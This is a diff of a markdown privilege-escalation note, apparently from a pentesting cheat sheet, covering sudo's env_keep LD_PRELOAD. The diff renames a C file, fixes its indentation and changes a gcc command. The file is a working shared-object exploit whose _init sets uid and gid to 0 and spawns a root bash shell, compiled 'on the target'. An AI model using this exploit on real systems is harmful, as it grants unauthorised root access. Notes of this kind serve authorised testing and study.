@@ -8,7 +8,7 @@ env_keep+=LD_PRELOAD
 
 With this included, we can privesc with any sudo command via the following
 
-shell.c
+**pwn.c**
 
 ```c
 #include <stdio.h>
@@ -18,15 +18,15 @@ shell.c
 void _init() {
 	unsetenv("LD_PRELOAD");
 	setgid(0);
-    setuid(0);
-    system("/bin/bash");
+	setuid(0);
+	system("/bin/bash");
 }
 ```
 
 We compile it on the target
 
 ```bash
-gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
+gcc -fPIC -shared -o pwn.so pwn.c -nostartfiles
 ```
 
 Examples:
